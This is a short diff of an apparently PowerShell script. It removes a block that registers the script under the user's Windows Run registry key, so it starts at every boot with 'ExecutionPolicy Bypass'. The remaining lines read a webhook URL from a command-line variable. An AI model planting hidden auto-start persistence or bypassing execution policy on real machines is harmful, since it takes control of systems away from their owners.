@@ -1,33 +1,3 @@
-# Add this script to startup to ensure it runs every time the system boots
-$scriptPath = $MyInvocation.MyCommand.Path  # Path of this script
-$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptName = "MyStartupScript2"  # You can change this name if you like
-
-# Check if the script is already added to startup to avoid duplicates
-$existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
-if ($existingEntry) {
-    Write-Host "Script is already added to startup." -ForegroundColor Yellow
-} else {
-    # Add the script to startup using powershell.exe to run the script
-    try {
-        # Add the full PowerShell command to registry
-        Set-ItemProperty -Path $regKey -Name $scriptName -Value "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
-        Write-Host "Script added to startup." -ForegroundColor Green
-    }
-    catch {
-        Write-Host "Error adding script to startup:" -ForegroundColor Red
-        Write-Host $_.Exception.Message
-    }
-
-    # Confirm that the entry has been added to the registry
-    $confirmation = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
-    if ($confirmation) {
-        Write-Host "Script successfully added to startup." -ForegroundColor Green
-    } else {
-        Write-Host "Failed to add script to startup." -ForegroundColor Red
-    }
-}
-
 # Ensure that the webhook URL is set directly from the command line
 $webhookURL = $dc  # $webhookURL is the variable passed via the command line
 
